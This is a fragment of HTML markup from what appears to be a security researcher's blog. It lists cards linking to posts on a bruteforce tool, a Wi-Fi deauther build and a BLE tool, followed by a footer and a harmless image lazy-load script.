      <div class="card-image" style="background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">rust</span>
            
            <h2 class="card-title">Enumerate/Bruteforce/Attack All the Things! Presenting Legba</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2018/07/deauth.png')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">bettercap</span>
            
            <h2 class="card-title">Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2017/09/dr_evil.jpg')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">ble</span>
        
        <h2 class="card-title">This Is Not a Post About BLE, Introducing BLEAH</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2025 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function() {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function(img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>

</body>
</html>
